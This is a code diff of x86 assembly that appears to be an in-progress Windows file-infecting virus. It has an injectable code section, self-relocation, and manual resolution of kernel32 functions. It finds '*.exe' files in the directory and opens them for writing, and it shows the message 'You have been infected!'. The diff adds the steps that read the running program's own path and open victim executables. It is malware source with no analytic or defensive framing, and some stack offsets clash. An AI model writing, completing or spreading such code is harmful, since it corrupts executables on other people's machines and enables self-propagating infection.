@@ -7,6 +7,8 @@ old_entry:
 .code inject
 	data_start EQU $
 	
+	; .data
+	strGMFN db 'GetModuleFileNameA', 0
     strF1A db 'FindFirstFileA', 0
     strFNA db 'FindNextFileA', 0
     strFC db 'FindClose', 0
@@ -23,13 +25,19 @@ old_entry:
     strQuery db '*.exe', 0
 	strCaption db 'Notice', 0
     strContent db 'You have been infected!', 0
-        
+    
+    ; .data?
+    filePath db 260 DUP(0) ; filePath[MAX_PATH]
+    win32FindData db 320 DUP(0) ; To store WIN32_FIND_DATAA
+    
+	; .const
 	; Order of each variable IN THE STACK
 	; Position relative to r|ebp calculated by -(Order * regSz)
-	
+    selfName EQU 11
 	selfImageBaseAddress EQU 1
 	selfSection EQU 2
 	selfEntry EQU 3
+	fileHand EQU 4 ; From FindFirstFile, for FindNextFile
 	readHand EQU 4
 	writeHand EQU 5
 	
@@ -53,6 +61,7 @@ old_entry:
     fclose EQU 14 		; CloseHandle
     fread EQU 15 		; ReadFile
     fwrite EQU 16 		; WriteFile
+    argv0 EQU 17
     loadlib EQU 17 		; LoadLibraryA
     getaddr EQU 18 		; GetProcAddress
     msgbox EQU 19 		; MessageBoxA
@@ -62,6 +71,7 @@ old_entry:
     
     entrySectionOffset EQU $ - offset strCFA
     
+; .code
 start:
     call here
     here:
@@ -132,6 +142,9 @@ start:
     k32import offset strWF
     toStack fwrite
     
+    k32import offset strGMFN
+    toStack argv0
+    
     k32import offset strLLA
     toStack loadlib
     
@@ -147,9 +160,37 @@ start:
     call fromStack(getaddr)
     toStack msgbox
     
-    push 0
+    ; Get name of current process
+    invoke fromStack(argv0),
+    		0, 							; Current process
+    		daccess(offset filePath), 	; To store output
+    		260							; MAX_PATH
+    
+    ; Open current file for READing
+    invoke fromStack(fopen),
+    		40000000h, 		; GENERIC_READ
+	    	0, 				; No sharing
+	    	0,
+	    	4,				; OPEN_ALWAYS
+	    	80h, 			; FILE_ATTRIBUTE_NORMAL
+	    	0
+    
+    ; Find first file in directory
+    push daccess(offset win32FindData)
     push daccess(offset strQuery)
     call fromStack(ffind1)
     
-
+    ; Open file
+    push 0
+    push 80h ; FILE_ATTRIBUTE_NORMAL
+    push 4 ; OPEN_ALWAYS
+    push 0
+	push 0 ; No sharing
+	push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
+	push daccess(offset win32FindData) + 2Ch ; cFileName in WIN32_FIND_DATAA
+	call fromStack(fopen)
+	toStack writeHand
+	
+	
+    
 end start
